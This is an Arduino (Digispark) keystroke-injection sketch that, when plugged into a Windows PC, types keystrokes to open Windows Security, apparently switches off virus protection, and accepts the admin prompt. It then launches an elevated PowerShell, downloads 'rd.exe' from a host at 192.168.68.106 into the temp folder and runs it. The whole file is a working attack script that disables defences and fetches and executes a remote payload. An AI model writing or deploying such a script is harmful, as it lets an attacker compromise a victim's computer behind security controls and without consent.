#include "DigiKeyboard.h"

#define KEY_ESC      41
#define KEY_TAB      43
#define KEY_F4       61

void setup() {
  pinMode(1, OUTPUT);
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ESC, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("virus pro");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);

  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.println("powershell Start-Process powershell -Verb runAs");
  DigiKeyboard.delay(4000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(600);
  DigiKeyboard.println("cd $env:TEMP ");
  DigiKeyboard.delay(100);
  DigiKeyboard.println("curl http://192.168.68.106/rd.exe -o rd.exe");
  DigiKeyboard.delay(1500);
  DigiKeyboard.println(".\\rd");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("exit");
  digitalWrite(1, HIGH);
  for(;;){}

}
